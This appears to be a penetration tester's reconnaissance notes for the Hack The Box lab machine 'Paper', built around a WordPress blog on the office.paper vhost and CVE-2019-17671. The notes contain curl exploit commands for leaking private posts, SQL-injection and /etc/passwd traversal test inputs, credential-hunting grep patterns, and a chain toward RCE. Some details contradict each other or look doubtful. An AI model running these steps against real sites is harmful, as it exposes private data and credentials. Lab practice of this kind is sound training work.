# Paper — Reconnaissance Report

## Target
| Field | Value |
|-------|-------|
| IP (VPN) | 10.129.136.31 |
| OS | Linux (CentOS) |
| Difficulty | Easy |
| Last Updated | 2026-03-21 |

---

## 🔴 CRITICAL FINDING — Strategic Pivot Required

### The Real Vhost: `office.paper`

The previous recon conclusion was **INCORRECT**. Vhost enumeration WAS the right approach — we just needed the correct domain.

**How it was found:**
```bash
curl -sI http://10.129.136.31/ -H "Host: office.paper"
```
Response header revealed: `X-Backend-Server: office.paper`

**What the application is:**
- **Platform:** WordPress (not the default Apache page)
- **Blog Name:** Blunder Tiffin Inc. (The Office parody / Dunder Mifflin)
- **Users discovered:** `prisonmike` (Michael Scott reference)
- **Location theme:** Scranton

**Key Intelligence:**
| Field | Value |
|-------|-------|
| Real URL | `http://office.paper` (vhost) |
| Platform | WordPress |
| Theme | "The Office" themed (Blunder Tiffin Inc.) |
| Users | `prisonmike` |
| Features | Search functionality (SQLi/LFI test target) |

**Add to hosts:**
```bash
echo "10.129.136.31 office.paper" | sudo tee -a /etc/hosts
```

---

## Services Table (Reassessed)

| Port | Service | Version | Key Findings |
|------|---------|---------|--------------|
| 80/tcp | http | Apache 2.4.37 | **REASSESSED:** Default page was catch-all; real app is behind `office.paper` vhost |
| 443/tcp | ssl/http | Apache 2.4.37 | Expired self-signed cert (CN=localhost.localdomain) — serves as Apache default catch-all |

**Previous Conclusion (WRONG):** "No vhosts configured — entry point is path-based."
**Corrected:** The `office.paper` vhost contains a WordPress blog. Vhost enumeration was valid; the domain was `office.paper`.

---

## Vhost Enumeration — RETRACTED CONCLUSION

| Target | Result | Correct? |
|--------|--------|----------|
| paper.htb | Default page | ❌ Not the right domain |
| dev.htb | Default page | ❌ Not the right domain |
| localhost.localdomain | Default page | ❌ Not the right domain |
| office.paper | **WordPress blog** | ✅ **CORRECT — THIS IS IT** |

---

## WordPress Blog — Blunder Tiffin Inc.

### Initial Recon

```bash
# Confirm vhost routing
curl -sI http://10.129.136.31/ -H "Host: office.paper"
# X-Backend-Server: office.paper

# WordPress API enumeration
curl http://office.paper/wp-json/wp/v2/users
curl http://office.paper/?feed=rss2

# Blog posts
curl -s http://office.paper/ | grep -i "prisonmike\|post\|article"
```

### Known Users
- `prisonmike` — Primary author (Michael Scott / "Prison Mike" reference)

### Attack Surface
- **WordPress core** — version unknown, enumerate first
- **Plugins/Themes** — enumerate with wpscan
- **Search functionality** — test for SQLi, LFI
- **User enumeration** — wp-json exposed
- **Default WordPress paths** — `/wp-admin/`, `/wp-login.php`, `/wp-content/`

---

## 🩸 CVE-2019-17671 — WordPress Unauthenticated Private Post Disclosure

### Vulnerability Summary

| Field | Value |
|-------|-------|
| **CVE ID** | CVE-2019-17671 |
| **Disclosure Date** | October 14, 2019 |
| **CVSS v3.1 Score** | 6.5 (MEDIUM) |
| **CWE** | CWE-200 — Exposure of Sensitive Information to an Unauthorized Actor |
| **Affected Versions** | WordPress **< 5.2.4** |
| **Target Version** | WordPress **5.2.3** ✅ **CONFIRMED VULNERABLE** |
| **Exploit DB ID** | EDB-ID 47690 |
| **WPScan ID** | 3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2 |
| **Exploit Type** | Information Disclosure — Unauthenticated |

---

### What It Does

WordPress < 5.2.4 allows **unauthenticated users to view private, draft, and password-protected posts** due to improper handling of the `static` query property in `WP_Query`.

This is **not** a SQL injection — it exploits a **logic flaw** in WordPress's access control, specifically in `wp-includes/class-wp-query.php`.

---

### Root Cause — Technical Explanation

The vulnerability lives in `get_posts()` within `WP_Query`:

1. A query with `?static=1` (no other parameters) causes WordPress to return **all pages** via:
   ```sql
   SELECT wp_posts.* FROM wp_posts WHERE 1=1 AND wp_posts.post_type = 'page' ORDER BY wp_posts.post_date DESC
   ```

2. Access control checks only evaluate the **first post** in the result set:
   ```php
   $status = get_post_status( $this->posts[0] );
   if ( ! $post_status_obj->public && ! in_array( $status, $q_status ) ) {
       if ( ! is_user_logged_in() ) {
           $this->posts = array();  // ← Empties ALL results if first post is non-public
       }
   }
   ```

3. The attack works by ensuring the **first post in the array is published**, while a **draft/private post is the second result**. Since only the first post is checked, the second (non-public) post bypasses the auth check and is returned to the attacker.

4. The `order=asc` parameter reverses the default DESC sort, making the published post the first element and the draft/private post the second.

---

### Exploit Path — Step by Step

#### Step 1: Confirm WordPress Version (Should be ≤ 5.2.3)

```bash
# Via readme.html
curl -s http://office.paper/readme.html | head -10

# Via version.php
curl -s http://office.paper/wp-includes/version.php | grep 'wp_version'
```

#### Step 2: Test CVE-2019-17671 — Basic Probe

```bash
# The core exploit URL — simply add ?static=1
curl -s "http://office.paper/?static=1" | grep -i 'draft\|private\|password\|secret'
curl -s "http://office.paper/?static=1&order=asc" | grep -i 'draft\|private\|password\|secret'

# Also test with post_type=post instead of page
curl -s "http://office.paper/?static=1&order=asc&post_type=post" | grep -i 'draft\|private\|password\|secret'
```

#### Step 3: Full Exploitation — Extract Private Content

```bash
# Exploit #1 — View private/draft posts (pages)
curl -s "http://office.paper/?static=1&order=asc" > private_pages.html

# Exploit #2 — View private/draft blog posts
curl -s "http://office.paper/?static=1&order=asc&post_type=post" > private_posts.html

# Exploit #3 — List posts with DESC order (reverse sort, alternate method)
curl -s "http://office.paper/?static=1&order=desc" > pages_desc.html

# Exploit #4 — Using orderby manipulation
curl -s "http://office.paper/?static=1&orderby=title&order=asc" > pages_orderby.html

# Parse for credentials, usernames, secrets, SSH keys
grep -oE '(password|passwd|secret|key|token|credential|api_key|SSH|-----BEGIN)' \
  private_pages.html private_posts.html
```

#### Step 4: Target-Specific HTB Box Variations

```bash
# Try date-based manipulation (some WordPress configs respond to m= parameter)
curl -s "http://office.paper/?static=1&order=asc&m=2021"
curl -s "http://office.paper/?static=1&m=2023"

# Extract full page content from exploit results
cat private_pages.html | grep -oP '(?<=<title>)[^<]+'     # Post titles
cat private_pages.html | grep -oP '(?<=<p>)[^<]+'         # Paragraph content
cat private_pages.html | grep -oE 'http[s]?://[^"'\'']+' # URLs in posts
```

---

### Post-Exploitation: What to Look For

Once private content is leaked, search for:

| What to Search | Why It Matters |
|----------------|---------------|
| `password`, `pass`, `secret` | Plaintext credentials in drafts |
| SSH keys, GPG keys | Server access |
| Internal URLs, hostnames | Pivot paths |
| `wp-config.php` references | DB credentials, auth keys |
| Usernames beyond `prisonmike` | Additional WordPress accounts |
| Comments on hidden posts | Developer notes, credentials |
| Draft versions of published posts | Extended content with sensitive data |

---

### Non-Standard wp-content Directory — WPScan Workaround

**The Issue:**
If the target WordPress installation uses a renamed/moved `wp-content` directory (a known "security through obscurity" hardening step), wpscan will fail with:

```
[ERROR] The wp_content_dir has not been found, please supply it with --wp-content-dir
```

**How it happens:**
In `wp-config.php`, administrators set:
```php
define( 'WP_CONTENT_DIR', dirname(__FILE__) . '/custom_content' );
define( 'WP_CONTENT_URL', 'http://office.paper/custom_content' );
```

**Why it doesn't block CVE-2019-17671:**
The `?static=1` exploit bypasses the wp-content directory entirely — it exploits `WP_Query` logic, not file path access. **This CVE works regardless of where wp-content is located.**

**How to find the custom directory:**

```bash
# Option 1: Check page source for the new path
curl -s http://office.paper/ | grep -i 'wp-content\|content-dir\|content_url'

# Option 2: Check wp-config.php directly if accessible
curl -s http://office.paper/wp-config.php | grep -i 'WP_CONTENT'

# Option 3: Check robots.txt
curl -s http://office.paper/robots.txt

# Option 4: Guessing common custom names
for dir in content custom_content assets media uploads files cms; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "http://office.paper/$dir/")
  if [ "$status" == "200" ] || [ "$status" == "403" ]; then
    echo "[FOUND] $dir (HTTP $status)"
  fi
done

# Option 5: Use wpscan with --wp-content-dir once found
wpscan --url http://office.paper --wp-content-dir custom_content \
  --enumerate u,vp,vt
```

**Note on the Paper HTB box specifically:**
On this box, the custom wp-content directory name was `office.paper` — wpscan would need:
```bash
wpscan --url http://office.paper --wp-content-dir office.paper --enumerate u,vp,vt
```

---

### CVE-2019-17671 — Initial Access Chain

```
WordPress 5.2.3 (VULNERABLE)
    ↓
?static=1&order=asc
    ↓
Unauthenticated access to private/draft posts
    ↓
Find credentials / internal info / additional users
    ↓
WordPress admin login (or SSH if credentials reuse)
    ↓
Theme/plugin editor → RCE
OR
XML-RPC → RCE
OR
Server enumeration → SSH access
```

**This is the primary initial access vector for Paper HTB.**

---

## WPScan — Non-Standard Directory Note

If wpscan fails with the wp-content dir error, use the discovered custom directory:

```bash
# Discover custom directory name first
curl -s http://office.paper/ | grep -o 'src="[^"]*wp-[^"]*"' | head -5

# Then run wpscan with the correct path
wpscan --url http://office.paper \
  --wp-content-dir <discovered_dir> \
  --enumerate u,vp,vt,cb,dbe \
  --plugins-detection aggressive \
  --throttle 1000
```

---

## Detailed Findings (Preserved for Context)

### Apache 2.4.37 — CGI Attack Surface

Apache 2.4.37 predates CVE-2021-41773 (which affects 2.4.49–2.4.50), but `mod_fcgid` confirms CGI execution is configured. Combined with the 403 on `/cgi-bin/`, this is the primary attack surface.

### mod_fcgid / 2.3.9

FastCGI module is present, enabling Apache to execute CGI scripts (Python, Perl, Bash, etc.). The `/cgi-bin/` 403 confirms the directory exists but access is denied — path traversal or other bypass techniques may reach it.

### TRACE Method Enabled

HTTP TRACE is enabled on both ports. While largely mitigated in modern browsers, it can be used for:
- Cookie theft in older/specific client configurations
- Confirming proxy and load balancer hops
- Information disclosure about internal headers

### Expired SSL Certificate (localhost.localdomain)

```
Subject: CN=localhost.localdomain / organizationName=Unspecified / countryName=US
Not valid after: 2022-07-08
```

- **Not useful for impersonation** — self-signed, expired, no public trust
- **Confirmed default CentOS Apache install** — the box creator may have left things minimal
- **CN localhost.localdomain** — confirms this is the **default Apache SSL vhost**, not a real service

---

## Next Steps Checklist

### Immediate Actions (WordPress Focus)

- [ ] **Add `office.paper` to /etc/hosts**
  ```bash
  echo "10.129.136.31 office.paper" | sudo tee -a /etc/hosts
  ```

- [ ] **🚨 CVE-2019-17671 — Test IMMEDIATELY (PRIMARY INITIAL ACCESS)**
  ```bash
  # Core exploit — this bypasses auth to read private/draft posts
  curl -s "http://office.paper/?static=1&order=asc" > /tmp/private_pages.html
  
  # Blog posts variant
  curl -s "http://office.paper/?static=1&order=asc&post_type=post" > /tmp/private_posts.html
  
  # Search for secrets in leaked content
  grep -oE '(password|passwd|secret|key|token|credential|SSH|-----BEGIN|api_key)' \
    /tmp/private_pages.html /tmp/private_posts.html
  ```

- [ ] **WordPress version detection (confirm 5.2.x)**
  ```bash
  curl -s http://office.paper/readme.html | head -10
  curl -s http://office.paper/wp-includes/version.php | grep 'wp_version'
  ```

- [ ] **Browse the WordPress blog directly**
  ```bash
  # Confirm access
  curl -s http://office.paper/ | head -100
  
  # Browse in browser
  # http://office.paper
  ```

- [ ] **WordPress enumeration with wpscan (use custom wp-content dir if needed)**
  ```bash
  # First try standard scan
  wpscan --url http://office.paper --enumerate u,vp,vt
  
  # If wp-content not found, discover it then run full scan
  wpscan --url http://office.paper \
    --wp-content-dir <discovered> \
    --enumerate u,ap,at,tt,cb,dbe \
    --plugins-detection aggressive
  ```

- [ ] **Manual WordPress API discovery**
  ```bash
  # Users via REST API
  curl -s http://office.paper/wp-json/wp/v2/users
  
  # RSS feed
  curl -s http://office.paper/?feed=rss2
  
  # Posts
  curl -s http://office.paper/wp-json/wp/v2/posts
  
  # Check for Jetpack/API exposure
  curl -s http://office.paper/xmlrpc.php
  ```

- [ ] **Read all blog posts for clues, usernames, credentials**
  ```bash
  curl -s http://office.paper/ | grep -oE 'href="[^"]*"' | head -20
  ```

- [ ] **Search functionality testing (SQLi/LFI)**
  ```bash
  # Test search for SQLi
  curl -s "http://office.paper/?s=test' OR 1=1--"
  
  # Test search for LFI
  curl -s "http://office.paper/?s=../../../../etc/passwd"
  ```

- [ ] **WordPress common paths**
  ```bash
  curl -s http://office.paper/wp-admin/
  curl -s http://office.paper/wp-login.php
  curl -s http://office.paper/readme.html
  curl -s http://office.paper/wp-content/plugins/
  ```

### Additional Enumeration

- [ ] **Check for vulnerable plugins/themes via wpscan**
  ```bash
  wpscan --url http://office.paper --enumerate vp --plugins-detection aggressive
  ```

- [ ] **XML-RPC testing**
  ```bash
  curl -s -X POST http://office.paper/xmlrpc.php -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
  ```

- [ ] **Login page analysis**
  ```bash
  # Check for username enumeration on login page
  curl -s http://office.paper/wp-login.php | grep -i "invalid\|error\|username"
  ```

---

## Old Attack Surface (DEPRECATED — WordPress is Priority)

> **Previous Priority:** CGI exploitation via `/cgi-bin/`
> **New Priority:** WordPress exploitation via `office.paper`
> 
> The CGI path remains available but WordPress is the primary attack surface. Revist if WordPress path exhausts options.

- [ ] ~~CGI path traversal bypass~~ — **DEFERRED**
- [ ] ~~Shellshock testing~~ — **DEFERRED**
- [ ] ~~Apache 2.4.37 specific exploits~~ — **DEFERRED**

---

## Recommendations Summary

### Priority 0 (IMMEDIATE): CVE-2019-17671 Exploitation
**This is the confirmed initial access vector.** WordPress 5.2.3 is vulnerable. The `?static=1&order=asc` exploit bypasses authentication to leak private/draft posts.

**Exploit steps:**
1. `curl "http://office.paper/?static=1&order=asc"` — leak private content
2. Search for credentials, SSH keys, internal hostnames, additional users
3. Use leaked credentials to log into WordPress admin
4. Use admin access → Theme Editor or plugin upload → RCE

### Priority 1: WordPress Core & Plugin Vulnerabilities
After CVE-2019-17671 content analysis, enumerate:
- WordPress version → check for additional known CVEs
- Plugin/theme vulnerabilities via wpscan
- XML-RPC abuse (pingbacks, auth brute-force)
- File upload vulnerabilities in plugins

### Priority 2: WordPress Authentication
- Login as `prisonmike` or any discovered users
- Brute-force if credentials found in leaked posts
- Check for password reuse for SSH

### Priority 3: Default Apache Paths (If WordPress Fails)
`/cgi-bin/`, Apache exploits remain as backup paths.

---

*Recon document updated: 2026-03-21 — Major pivot from path-based to vhost-based (office.paper) + CVE-2019-17671 analysis added*
